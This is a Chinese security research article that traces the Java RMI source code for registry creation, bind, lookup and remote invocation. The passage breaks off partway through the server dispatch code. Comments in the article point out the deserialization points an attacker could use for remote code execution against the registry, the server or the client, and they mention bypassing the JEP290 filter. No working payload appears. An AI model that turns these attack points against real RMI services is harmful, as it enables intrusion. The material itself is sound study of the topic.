> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tAPCzt6Saq5q7W0P7kBdJg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50QdgiaVhJnJ6ibnY5paictMtHibpJoaDxASFx1gIQxeDteTR6vkE9odfGNw/640?wx_fmt=png)

**0x00  前言**
============

Java 反序列化漏洞一直都是 Java Web 漏洞中比较难以理解的点，尤其是碰到了 RMI 和 JNDI 种种概念时，就更加的难以理解了。笔者根据网上各类相关文章中的讲解，再结合自己对 RMI JRMP 以及 JNDI 等概念的理解，对 RMI 客户端、服务端以及 rmiregistry 之间的关系，和三方之间的多种攻击方式进行了详细的介绍，希望能对各位读者学习 Java Web 安全有所帮助。

**0x01  RPC 框架原理简介**
====================

首先讲这些之前要明白一个概念，所有编程中的高级概念，看似很高级的一些功能什么的，都是建立于最基础的代码之上的。

例如此次涉及到的分布式的概念，就是通过 java 的 socket，序列化，反序列化和反射来实现的。

举例说明 客户端要调用服务端的 A 对象的 A 方法，客户端会生成 A 对象的代理对象，代理对象里通过用 Socket 与服务端建立联系，然后将 A 方法以及调用 A 方法是要传入的参数序列化好通过 socket 传输给服务端，服务端接受反序列化接受到的数据，然后通过反射调用 A 对象的 A 方法并将参数传入，最终将执行结果返回给客户端，给人一种客户端在本地调用了服务端的 A 对象的 A 方法的错觉。

**0x02  RMI 流程源码分析**
====================

到后来 JAVA RMI 这块也不例外 但是为了方便更灵活的调用发展成了以下的样子

在客户端 (远程方法调用者) 和服务端 (远程方法提供者) 之间又多了一个丙方也就所谓的 Registry 也就是注册中心。

启动这个注册中心的代码非常简单，如下所示

这个 Registry 是一个单独的程序 路径位于 / Library/Java/JavaVirtualMachines/jdk1.8.0_221.jdk/Contents/Home/bin/rmiregistry

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50BSghco9RaswDrIqnvrT39tHXibkNUyt7qsIzHtOeYr9L9FUPE1I9DHA/640?wx_fmt=png)

刚刚所示的启动 RMIRegistry 的代码，也就是调用了这个 rmiregistry 可执行程序而已。

简单 follow 一下代码

```
public static Registry createRegistry(int port) throws RemoteException {
        return new RegistryImpl(port);
    }
```

```
public RegistryImpl(final int var1) throws RemoteException {
        this.bindings = new Hashtable(101);
        if (var1 == 1099 && System.getSecurityManager() != null) {
            try {
           ......
        } else {
            LiveRef var2 = new LiveRef(id, var1);
            this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter));
        }


    }
```

很简单 没啥东西 liveRef 里面就四个属性

```
public class LiveRef implements Cloneable {
    //指向一个TCPEndpoint对象，指定的Registry的ip地址和端口号
    private final Endpoint ep;
    //一个目前不知道做什么用的id号
    private final ObjID id;
    //为null
    private transient Channel ch;
    //为true
    private final boolean isLocal;
    ......
    }
```

this.setup(new UnicastServerRef(var2, RegistryImpl::registryFilter)); 这段里面有个参数 RegistryImpl::registryFilter 这个东西就是 jdk1.8.121 版本以后添加的 registryFilter 专门用来校验传递进来的反序列化的类的，不在反序列化白名单内的类就不准进行反序列化操作，具体的方法代码如下

```
private static Status registryFilter(FilterInfo var0) {
    if (registryFilter != null) {
        Status var1 = registryFilter.checkInput(var0);
        if (var1 != Status.UNDECIDED) {
            return var1;
        }
    }


    if (var0.depth() > 20L) {
        return Status.REJECTED;
    } else {
        Class var2 = var0.serialClass();
        if (var2 != null) {
            if (!var2.isArray()) {
              //可以很清楚的看到白名单的范围就下面这九个类型可以被反序列化
                return String.class != var2 
                  && !Number.class.isAssignableFrom(var2) 
                  && !Remote.class.isAssignableFrom(var2) 
                  && !Proxy.class.isAssignableFrom(var2) 
                  && !UnicastRef.class.isAssignableFrom(var2) 
                  && !RMIClientSocketFactory.class.isAssignableFrom(var2) 
                  && !RMIServerSocketFactory.class.isAssignableFrom(var2) 
                  && !ActivationID.class.isAssignableFrom(var2) 
                  && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
            } else {
                return var0.arrayLength() >= 0L && var0.arrayLength() > 1000000L ? Status.REJECTED : Status.UNDECIDED;
            }
        } else {
            return Status.UNDECIDED;
        }
    }
}
```

这个白名单先暂且放一放，后面用到了再说。执行完 new UnicastServerRef(var2, RegistryImpl::registryFilter) 后简单看一下 UnicastServerRef 对象里的内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50zDnw0icL6xEcSSOaVhlRWfIdnJNIHaCVmdYxZUly2DPAeTBv0hsLYbw/640?wx_fmt=png)

setup 方法内容

```
private void setup(UnicastServerRef var1) throws RemoteException {
        this.ref = var1;
        var1.exportObject(this, (Object)null, true);
    }
```

UnicastServerRef.exportObject() 方法内容

```
public Remote exportObject(Remote var1, Object var2, boolean var3) throws RemoteException {
    //获取RegistryImpl的class对象
    Class var4 = var1.getClass();


    Remote var5;
    try {
        //Util.createProxy返回的值为RegistryImpl_Stub,这个stub在后面会进行讲解
        var5 = Util.createProxy(var4, this.getClientRef(), this.forceStubUse);
    } catch (IllegalArgumentException var7) {
        throw new ExportException("remote object implements illegal remote interface", var7);
    }
    //RegistryImpl_Stub继承自RemoteStub判断成功
    if (var5 instanceof RemoteStub) {
      //为Skeleton赋值，通过this.skel = Util.createSkeleton(var1)来进行赋值，最终Util.createSkeleton(var1)返回的结果为一个RegistryImpl_Skel对象，这个Skeleton后面也会讲
        this.setSkeleton(var1);
    }
    //实例化一个Target对象
    Target var6 = new Target(var1, this, var5, this.ref.getObjID(), var3);
    //做一个绑定这个target对象里有stub的相关信息
    this.ref.exportObject(var6);
    this.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);
    //最终LocateRegistry.createRegistry(1099)会返回一个RegistryImpl_Stub对象
    //同时启动rmiregistry,并监听指定端口
    return var5;
}
```

很好这样启动 rmiregistry 的过程就简单分析完毕了，但是此时有一个问题，就是为什么会需要 rmiregistry 这么一个注册机制？客户端和服务端之间直接通过 Socket 互相调用不就好了么？想要知道答案就请耐心往下看

首先看下面这个 RMI 简单的流程图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50FTIOUBibQWia7BpxIx8e4yWX4CfNvHy0u5K2t6twtkmRehsmxEACrsjA/640?wx_fmt=png)

在考虑为什么需要这个 rmiregistry 之前，先思考一个比较尴尬的问题。就是客户端 (远程方法调用方) 要想调用服务端 (远程放方法服务方) 的话，客户端要怎样才能知道服务端用来提供远程方法调用服务的 ip 地址和端口号？你说直接事先商量好然后写死在代码里面？可是服务方提供的端口号都是随机的啊，总不能我服务端每增加一个新的远程方法提供类就手动指定一个新的端口号吧？

所以现在就很尴尬，陷入了一个死循环，客户端想要调用服务端的方法客户端就需要先知道服务端的地址和对应的端口号，但是客户端又不知道因为没人告诉他。。。所以就相当的头痛。

此时就有了 rmiregistry 这么一个东西，我们先把 rmiregistry 称为丙方，功能很简单，服务端每新提供一个远程方法，都会来丙方 (rmiregistry) 这里注册一下，写明提供该方法远程条用服务的 ip 地址以及所对应的端口以及别的一些信息。

如下面的代码所示，首先我们如果要写一个提供远程方法调用服务的类，首先先写一个接口并继承 Remote 接口，

```
public interface IHello extends Remote {
    //sayHello就是客户端要调用的方法，需要抛出RemoteException
    public String sayHello()throws RemoteException;
}
```

然后写一个类来实现这个接口

```
package com.rmiTest.IHelloImpl;


import com.rmiTest.IHello;


import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
// 该类可以选择继承UnicastRemoteObject，也可以通过下面注释中的这种形式，其实本质都一样都是调用了
// exportObject()方法
// Remote remote = UnicastRemoteObject.exportObject(new HelloImpl());
// LocateRegistry.getRegistry("127.0.0.1",1099).bind("hello",remote);
public class HelloImpl extends UnicastRemoteObject implements IHello {
  
    public HelloImpl() throws RemoteException {


    }


    @Override
    public String sayHello() {
        System.out.println("hello");
        return "hello";
    }
}
```

最后将这个 HelloImpl 类注册到也可以说是绑定到 rmiregistry 也就是丙方中

```
package com.rmiTest.provider;

import com.chouXiangTest.impl.HelloServiceImpl;
import com.rmiTest.IHelloImpl.HelloImpl;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMIProvider {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        LocateRegistry.getRegistry("127.0.0.1",1099).bind("hello",new HelloImpl());
    }
}
```

首先我们先跟一下 HelloImpl 这个远程对象的实例化过程，首先 HelloImpl 是 UnicastRemoteObject 的子类，所以 HelloImpl 在实例化时会先调用 UnicastRemoteObject 类的构造方法，其构造方法内容如下

```
protected UnicastRemoteObject(int port) throws RemoteException
{
      //这个prot参数是用来指定远程方法对应的端口的，默认情况下是随机的，也可以手动传入参数来指定
        this.port = port;
        exportObject((Remote) this, port);
    }
```

发现其会调用一个 exportObject 方法，继续跟进该方法

```
private static Remote exportObject(Remote obj, UnicastServerRef sref)
    throws RemoteException
{
    // if obj extends UnicastRemoteObject, set its ref.
    if (obj instanceof UnicastRemoteObject) {
        ((UnicastRemoteObject) obj).ref = sref;
    }
    return sref.exportObject(obj, null, false);
}
```

继续跟进 UnicastServerRef.exportObject 方法，其内部代码如下

```
public Remote exportObject(Remote var1, Object var2, boolean var3) throws RemoteException {
  //获取HelloImpl的class对象  
  Class var4 = var1.getClass();

    Remote var5;
    try {
      //这一步就是创建一个proxy对象，该proxy对象是实现了IHello接口，使用的Handler是RemoteObjectInvocationHandler
        var5 = Util.createProxy(var4, this.getClientRef(), this.forceStubUse);
    } catch (IllegalArgumentException var7) {
        throw new ExportException("remote object implements illegal remote interface", var7);
    }

    if (var5 instanceof RemoteStub) {
        this.setSkeleton(var1);
    }

    Target var6 = new Target(var1, this, var5, this.ref.getObjID(), var3);
    this.ref.exportObject(var6);
    this.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);
    return var5;
}
```

其中 Util.createProxy() 方法返回的结果如下图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50yVtiasMfJ888xiagAaYjegO7fhyyC5UbmLiaicCGv1lNXuRicxaEulQ1qfQ/640?wx_fmt=png)

继续跟入 this.ref.exportObject(var6)，经过一系列的嵌套调用，最终来到了 TCPTransport 的 exportObject 方法，该方法内容如下

```
public void exportObject(Target var1) throws RemoteException {
    synchronized(this) {
      //为远程方法开方一个端口
        this.listen();
        ++this.exportCount;
    }

    boolean var2 = false;
    boolean var12 = false;

    try {
        var12 = true;
        super.exportObject(var1);
        var2 = true;
        var12 = false;
    } finally {
        if (var12) {
            if (!var2) {
                synchronized(this) {
                    this.decrementExportCount();
                }
            }

        }
    }
```

此处跟进 this.listen() 方法

```
private void listen() throws RemoteException {
    assert Thread.holdsLock(this);
    //获取TCPEndpoint对象
    TCPEndpoint var1 = this.getEndpoint();
  //从TCPEndpoint对象中获取端口号，默认情况下是为0
    int var2 = var1.getPort();
    if (this.server == null) {
        if (tcpLog.isLoggable(Log.BRIEF)) {
            tcpLog.log(Log.BRIEF, "(port " + var2 + ") create server socket");
        }


        try {
          //此方法执行完成后会随机分配一个端口号
            this.server = var1.newServerSocket();
            Thread var3 = (Thread)AccessController.doPrivileged(new NewThreadAction(new TCPTransport.AcceptLoop(this.server), "TCP Accept-" + var2, true));
            var3.start();
        } catch (BindException var4) {
            throw new ExportException("Port already in use: " + var2, var4);
        } catch (IOException var5) {
            throw new ExportException("Listen failed on port: " + var2, var5);
        }
    } else {
        SecurityManager var6 = System.getSecurityManager();
        if (var6 != null) {
            var6.checkListen(var2);
        }
    }


}
```

经由以上分析，我们可知每创建一个远程方法对象，程序都会为其创建一个独立的线程，并为其指定一个端口号。

在分析完了远程方法提供对象实例化的过程后，也简单跟一下这个 getRegistry() 和 bind() 方法吧

首先是 getRegistry() 代码如下

```
public static Registry getRegistry(String host, int port,
                                       RMIClientSocketFactory csf)
        throws RemoteException
    {
        Registry registry = null;

        if (port <= 0)
            port = Registry.REGISTRY_PORT;

        if (host == null || host.length() == 0) {
            // If host is blank (as returned by "file:" URL in 1.0.2 used in
            // java.rmi.Naming), try to convert to real local host name so
            // that the RegistryImpl's checkAccess will not fail.
            try {
                host = java.net.InetAddress.getLocalHost().getHostAddress();
            } catch (Exception e) {
                // If that failed, at least try "" (localhost) anyway...
                host = "";
            }
        }

        /*
         * Create a proxy for the registry with the given host, port, and
         * client socket factory.  If the supplied client socket factory is
         * null, then the ref type is a UnicastRef, otherwise the ref type
         * is a UnicastRef2.  If the property
         * java.rmi.server.ignoreStubClasses is true, then the proxy
         * returned is an instance of a dynamic proxy class that implements
         * the Registry interface; otherwise the proxy returned is an
         * instance of the pregenerated stub class for RegistryImpl.
         **/
        LiveRef liveRef =
            new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                        new TCPEndpoint(host, port, csf, null),
                        false);
        RemoteRef ref =
            (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);

        return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
    }
```

关键点在在于后面这几行代码

```
LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                              new TCPEndpoint(host, port, csf, null),
                              false);
RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);
return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
```

和 LocateRegistry.createRegistry() 有那么点相似

最关键的在于下面这行

```
//几乎一模一样 传递进去的第一个参数都是RegistryImpl.class，第二个参数
//第二个参数是同样的UnicastRef里面又包含了一个同样的LiveRef，以及最后同样的false
return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
```

所以说从源码上分析 LocateRegistry.getRegistry() 和 LocateRegistry.createRegistry() 最后的返回结果应该是一样的，我们看一下结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50DgclUjicE0CSbnKhiakQ3g9dw6rf7DSicLKxicfK0bBKxCkMHYQyQ947ZA/640?wx_fmt=png)

果然不出所料返回的同样都是 RegistryImpl_Stub 对象，只不过 LocateRegistry.getRegistry() 执行完不会在本地再开一个监听端口罢了。

好了 现在我们有了一个 RegistryImpl_Stub 对象，我们要用它来将我们的 HelloImpl 注册到 rmiregistry 中，用到的是 RegistryImpl_Stub.bind() 方法。

ok，hold on 我们先来了解一下这个 RegistryImpl_Stub 首先该类是继承了 RemoteStub，并实现了 Registry, Remote 接口 (我们的 HelloImpl 也实现了这个接口)，

该类的方法不多，就下面截图里这么些。没必要全都看，先看 bind 就行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50e1Z2o0GZmhricia5U7Nb8kRDWXnSzUwtzlLUklErpgnLicAFwk2TueM5w/640?wx_fmt=png)

bind 方法详细代码如下

```
//var1为字符串“hello”，var2就是咱们的HelloImpl对象
public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
    try {
      //这个就不细跟了，想想也知道是用来进行TCP通信的，里面存了rmiregistry的地址信息，具体怎么实现没必要整这么细，第三个参数0关乎到rmiregistry的RegistryImpl_Skel的dispathc方法里的switch究竟case哪一个。
        RemoteCall var3 = this.ref.newCall(this, operations, 0, 4905912898345647071L);

        try {
            //创建一个ConnectionOutputStream对象
            ObjectOutput var4 = var3.getOutputStream();
            //序列化字符串“hello”
            var4.writeObject(var1);
            //序列化HelloImpl对象
            var4.writeObject(var2);
         
        } catch (IOException var5) {
            throw new MarshalException("error marshalling arguments", var5);
        }
        //向rmiregistry发送序列化数据
        this.ref.invoke(var3);
        this.ref.done(var3);
      
    } catch (RuntimeException var6) {
        throw var6;
    } catch (RemoteException var7) {
        throw var7;
    } catch (AlreadyBoundException var8) {
        throw var8;
    } catch (Exception var9) {
        throw new UnexpectedException("undeclared checked exception", var9);
    }
}
```

这里需要注意下，这里向 rmiregistry 发送的是序列化信息，既然一方有序列化的行为那么另一方必然会有反序列化的行为。

到此为止服务端也就是远程方法服务方这边的操作暂且告一段落，因为此时我们的 HelloImpl 已经注册到了 rmiregistry 中。

接下来我们返回 rmiregistry 的代码，来看一看这边的情况。

之前跟踪 rmiregistry 这边的 LocateRegistry.createRegistry() 这段代码时有经过这样一行代码

```
//RegistryImpl_Stub继承自RemoteStub判断成功
if (var5 instanceof RemoteStub) {
  //为Skeleton赋值，通过this.skel = Util.createSkeleton(var1)来进行赋值，最终Util.createSkeleton(var1)返回的结果为一个RegistryImpl_Skel对象，这个Skeleton后面也会讲
    this.setSkeleton(var1);
}
```

这个 Skeleton 就是前面流程里面的骨架，当执行完上面这两步的时候，UnicastServerRef 的 skel 属性被赋值为一个 RegistryImpl_Skel 对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50c2WwaDA88N8kZgybjuczjR54A2kkqfVuUvTD7TTa0ADj6IvAlkRNEA/640?wx_fmt=png)

我们来看一下这个 RegistryImpl_Skel 的相关信息，首先该类实现了 Skeleton 接口，该类的方法很少，如下图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50UI8svMNl06dX8fP3FRdbqOwytR8oVEVQdoHia5SQ6qHnnAX7qcINe1Q/640?wx_fmt=png)

其中最关键的方法就是 dispatch 方法，我们看下在 Skeleton 接口中对该方法的一个描述

```
/**
 * Unmarshals arguments, calls the actual remote object implementation,
 * and marshals the return value or any exception.
 * 解封装参数，调用实际远程对象实现，并封装返回值或任何异常。
 * @param obj remote implementation to dispatch call to
 * @param theCall object representing remote call
 * @param opnum operation number
 * @param hash stub/skeleton interface hash
 * @exception java.lang.Exception if a general exception occurs.
 * @since JDK1.1
 * @deprecated no replacement
 */
@Deprecated
void dispatch(Remote obj, RemoteCall theCall, int opnum, long hash)
    throws Exception;
```

不难理解该方法就是对传入的远程调用信息进行分派调度的。其部分代码如下。

```
//之前在服务端时进行LocateRegistry.getRegistry().bind()操作时
// RemoteCall var3 = this.ref.newCall(this, operations, 0, 4905912898345647071L);
//在这一步中封装了四个参数 有三个在这里用到了 var3为0，var2为即为StreamRemoteCall，封装有“hello”字符串和HelloImpl对象的序列化信息。
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var3 < 0) {
        if (var4 == 7583982177005850366L) {
            var3 = 0;
        } else if (var4 == 2571371476350237748L) {
            var3 = 1;
        } else if (var4 == -7538657168040752697L) {
            var3 = 2;
        } else if (var4 == -8381844669958460146L) {
            var3 = 3;
        } else {
            if (var4 != 7305022919901907578L) {
                throw new UnmarshalException("invalid method hash");
            }

            var3 = 4;
        }
    } else if (var4 != 4905912898345647071L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    }
    //这个RegistryImpl会在rmiregistry运行期间一直存在，稍后会仔细讲解
    RegistryImpl var6 = (RegistryImpl)var1;
    String var7;
    ObjectInput var8;
    ObjectInput var9;
    Remote var80;
    switch(var3) {
    //var3的值为0，自然是case0
    case 0:
        RegistryImpl.checkAccess("Registry.bind");

        try {
            //获取输入流
            var9 = var2.getInputStream();
             //反序列化“hello”字符串
            var7 = (String)var9.readObject();
            //这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像
            //这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从                 而进行通信的。
            //这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注               册中心，导致其反序列化RCE
            var80 = (Remote)var9.readObject();
        } catch (ClassNotFoundException | IOException var77) {
            throw new UnmarshalException("error unmarshalling arguments", var77);
        } finally {
            var2.releaseInputStream();
        }
        //RegistryImpl对象有一个binding属性，是一个HashMap，这个HashMap里存储了所有注册了的远程调用方法的方法名，和其对应的stub。
        var6.bind(var7, var80);
        ......
    }

}
```

我们来看一个这个 binding 属性里的详细信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50aob0ia3TLYmk0gOjNcSicguThRfIQicpOrpanM5qPFAyep5p9NRb6aurQ/640?wx_fmt=png)

从这里我们明白了 rmiregistry 的本质就是一个 HashMap，所有注册过的远程方法以键值对的形式存放在这里，当客户端来查询时，rmiregistry 将对应的键值对中的 Proxy 返回给客户端，这样客户端就知道了服务端的地址和所对应的端口号，就可以进行通信了。

这其中有一个比较关键的类，在后续的绕过高版本 JDK JEP290 的白名单是会用到，就是 UnicastRef，详观察不难发现该对象中存有 rmi 服务端的 ip 地址以及对应远程方法的端口号，该类在客户端、rmiregistry、以及服务端的通信中都起到了非常重要的作用，UnicastRef 中有一个 newCall 方法 具体代码如下。

```
public RemoteCall newCall(RemoteObject var1, Operation[] var2, int var3, long var4) throws RemoteException {
    clientRefLog.log(Log.BRIEF, "get connection");
    Connection var6 = this.ref.getChannel().newConnection();

    try {
        clientRefLog.log(Log.VERBOSE, "create call context");
        if (clientCallLog.isLoggable(Log.VERBOSE)) {
            this.logClientCall(var1, var2[var3]);
        }

        StreamRemoteCall var7 = new StreamRemoteCall(var6, this.ref.getObjID(), var3, var4);

        try {
            this.marshalCustomCallData(var7.getOutputStream());
        } catch (IOException var9) {
            throw new MarshalException("error marshaling custom call data");
        }

        return var7;
    } catch (RemoteException var10) {
        this.ref.getChannel().free(var6, false);
        throw var10;
    }
}
```

该方法会在 java 的 DGC(分布式垃圾回收机制) 中被调用，DGC 则是我们绕过高版本 JDK 反序列化限制的一个重要的环节

首先客户端的代码

```
package com.rmiTest.customer;

import com.rmiTest.IHello;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;

public class RMICustomer {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("hello");
        System.out.println(hello.sayHello());
    }
}
```

LocateRegistry.getRegistry() 没必要再分析一遍了，直接看 lookup 方法，部分代码如下  

```
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
    try {
        //可以看到这次传递的第三个参数就不是0而是2了，同样的返回一个StreamRemoteCall对象
        RemoteCall var2 = this.ref.newCall(this, operations, 2, 4905912898345647071L);

        try {
            //同样的生成一个ConnectionOutputStream对象
            ObjectOutput var3 = var2.getOutputStream();
            //序列化“hello”字符串
            var3.writeObject(var1);
        } catch (IOException var17) {
            throw new MarshalException("error marshalling arguments", var17);
        }
        //和rmiregistry进行通信查询
        this.ref.invoke(var2);
        
        Remote var22;
        try {
            //获取rmiregistry返回的输入流
            ObjectInput var4 = var2.getInputStream();
            //反序列化返回的Stub
            //同样在反序列化rmiregistry返回的Stub时这个点我们也可以利用lookup方法，理论上，我们可以在客              户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
            var22 = (Remote)var4.readObject();
......
        } finally {
            this.ref.done(var2);
        }
        return var22;
......
}
```

这里又提到了 Stub 我们来看看其反序列化完成后是什么样的吧

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50Fvyou29CDYTSNaOaiasibxhvNgJHKnV044sBpUG5ib4T0yxmQpibdlyDag/640?wx_fmt=png)

和之前在 rmiregistry 中看到的那个 HashMap 中的值一模一样，这下客户端就知道服务端的地址和端口号了，通过这些信息就可以和服务端进行通信了。

不过在此之前在看一下 rmiregistry 是怎么处理客户端的查询信息的。

```
//为什么走case2 这里就不再重提了
case 2:
    try {
        //获取客户端传来的输入流
        var8 = var2.getInputStream();
        //反序列化字符串“hello”
        //同样在反序列化客户端传来的查询数据时，这个点我们也可以利用lookup方法，理论上，我们可以在客              户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端
        //尽管lookup时客户端似乎只能传递String类型，但是还是那句话，只要后台不做限制，客户端的东西皆可控
        var7 = (String)var8.readObject();
    } catch (ClassNotFoundException | IOException var73) {
        throw new UnmarshalException("error unmarshalling arguments", var73);
    } finally {
        var2.releaseInputStream();
    }
    //调用RegistryImpl.lookup方法，返回的查询结果就是hello所对应的那个Proxy对象
    var80 = var6.lookup(var7);

    try {
      //实例化一个输出流
        ObjectOutput var82 = var2.getResultStream(true);
      //序列化Proxy对象
        var82.writeObject(var80);
        break;
    } catch (IOException var72) {
        throw new MarshalException("error marshalling return", var72);
    }
```

如此这般，这般如此，rmiregistry 这块处理客户端的查询信息的部分就简单分析完了。

然后回到客户端这里

```
//返回一个实现了IHello接口的Proxy对象
    IHello hello = (IHello) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("hello");
    //表面上时执行sayHello方法，实际上执行的是Proxy对象的Invoke方法
    System.out.println(hello.sayHello());
```

贴一下调用链

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp509do5zbib7DtUSronZbfKb4ascrGfZQzHTpC8iaRCaTZJ5QCqE0JAhUAw/640?wx_fmt=png)

可以看到核心内容都在 UnicastRef 的 Invoke 方法, 下面是该方法的部分代码  

```
//var1 为当前的Proxy对象，
public Object invoke(Remote var1, Method var2, Object[] var3, long var4) throws Exception {

    ......
    //创建一个链接对象
    Connection var6 = this.ref.getChannel().newConnection();
    StreamRemoteCall var7 = null;
    boolean var8 = true;
    boolean var9 = false;

    Object var13;
    try {
        ......
        //和getRegistry()与creatRegistry()一样 ，第三个参数为-1，但是这次调用的并不是                                  RegistryImpl_Skel.bind方法    
        var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);
        
        Object var11;
        try {
            //获取输出流
            ObjectOutput var10 = var7.getOutputStream();
            //虽然没看里面的具体实现但是猜也能猜得到里面在序列化了一些东西
            this.marshalCustomCallData(var10);
            //获取要传递的参数类型，可是这次我们没传参数所以就没有
            var11 = var2.getParameterTypes();
            //如果传递的有参数的话会执行下面这个for循环，把参数相关的信息也序列化到里面
            for(int var12 = 0; var12 < ((Object[])var11).length; ++var12) {
                    //由于该方法会将调用的远程方法的参数进行反序列化，由此此处也可以进行利用，可以称为客户端对服务端进行反序列化攻击的点
              //也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。
                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);
                }
            ......
              
        }
        //像服务端发送序列化的数据
        var7.executeCall();

        try {
            //获取该远程方法的返回值类型
            Class var46 = var2.getReturnType();
          
             ......
            //获取输入流  
            var11 = var7.getInputStream();
            //解封装参数将返回值赋值给var46,也就是把返回的结果字符串“hello”赋值给var47
            //既然将返回的参数还原了，那么其中必定包含了反序列化，由此此处可以是服务端对客户端进行反序列化攻击的              点
          //也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。
            Object var47 = unmarshalValue(var46, (ObjectInput)var11);
            var9 = true;
            clientRefLog.log(Log.BRIEF, "free connection (reuse = true)");
            //释放链接通道
            this.ref.getChannel().free(var6, true);
            var13 = var47;
        } catch (ClassNotFoundException | IOException var40) {
          
            ......
              
        } finally {
            try {
                var7.done();
            } catch (IOException var38) {
                ......
            }

        }
    } catch (RuntimeException var42) {
      
      ......
        
    }
    //最终返回var46的值
    return var13;
}
```

ok 客户端这边的处理过程到此就已经完毕了, 接下来跟到服务端看一看。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dG3IRIwCQwibhggQLyM5Fp50dIoR0chMqUjiaIdGI9NSPVicDVURPJWGHbJny4uSkIh0dx2RFpGkj5uw/640?wx_fmt=png)

根据调用链信息，先来看 UnicastServerRef.dispatch() 方法

```
//Var1为实现了Remote接口的HelloImpl对象，Var2为客户端传来的StreamRemoteCall对象该对象里有ConnectionInputStream，也就是说远程调用的参数都在这里面存着
public void dispatch(Remote var1, RemoteCall var2) throws IOException {
    try {
        int var3;
        ObjectInput var41;
        try {
            //获取输入流
            var41 = var2.getInputStream();
            //读出来-1
            var3 = var41.readInt();
        } catch (Exception var38) {
            throw new UnmarshalException("error unmarshalling call header", var38);
        }

        if (this.skel != null) {
            this.oldDispatch(var1, var2, var3);
            return;
        }

        if (var3 >= 0) {
            throw new UnmarshalException("skeleton class not found but required for client version");
        }

        long var4;
        try {
            var4 = var41.readLong();
        } catch (Exception var37) {
            throw new UnmarshalException("error unmarshalling call header", var37);
        }

        MarshalInputStream var7 = (MarshalInputStream)var41;
        var7.skipDefaultResolveClass();
        Method var42 = (Method)this.hashToMethod_Map.get(var4);
        if (var42 == null) {
            throw new UnmarshalException("unrecognized method hash: method not supported by remote object");
        }

        this.logCall(var1, var42);
        Object[] var9 = null;

        try {
            this.unmarshalCustomCallData(var41);
            //从 ConnectionInputStream里反序列化出远程调用的参数
            //这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递               恶意的反序列化数据进来
            var9 = this.unmarshalParameters(var1, var42, var7);
        } catch (AccessException var34) {
            ((StreamRemoteCall)var2).discardPendingRefs();
            throw var34;
        } catch (ClassNotFoundException | IOException var35) {
            ((StreamRemoteCall)var2).discardPendingRefs();
            throw new UnmarshalException("error unmarshalling arguments", var35);
        } finally {
            var2.releaseInputStream();
        }

        Object var10;
        try {
            //反射调用对应的远程方法
            var10 = var42.invoke(var1, var9);
        } catch (InvocationTargetException var33) {
            throw var33.getTargetException();
        }

        try {
            //获取输出流
            ObjectOutput var11 = var2.getResultStream(true);
            //获取返回值类型
